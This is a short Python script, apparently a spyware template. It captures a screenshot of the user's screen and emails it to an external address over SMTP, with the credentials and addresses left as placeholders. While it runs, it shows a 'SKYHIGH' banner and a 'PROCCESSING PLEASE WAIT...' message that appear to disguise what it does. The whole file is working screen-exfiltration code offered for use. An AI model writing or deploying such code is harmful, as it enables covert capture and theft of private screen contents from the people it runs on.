import pyautogui
import smtplib
import pyfiglet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

# take screenshot
screenshot = pyautogui.screenshot()
screenshot.save('screenshot.png') #FILE NAME TO SAVE
# create an email message
msg = MIMEMultipart()
msg['Subject'] = '' # EDIT THIS
msg['From'] = '' #EDIT THIS
msg['To'] = '' # receiver

# attach the screenshot
with open('screenshot.png', 'rb') as f:
    img_data = f.read()
image = MIMEImage(img_data, name='screenshot.png')  #get the file name
msg.attach(image)
ascii_banner = pyfiglet.figlet_format("SKYHIGH")
print(ascii_banner)
print("PROCCESSING PLEASE WAIT...")
# send the email
server = smtplib.SMTP_SSL('YOUR SMTPHOST', 465)
server.ehlo()
server.login("EMAIL", "PASSWORD")
server.send_message(msg)
print("SEND!")
server.quit()


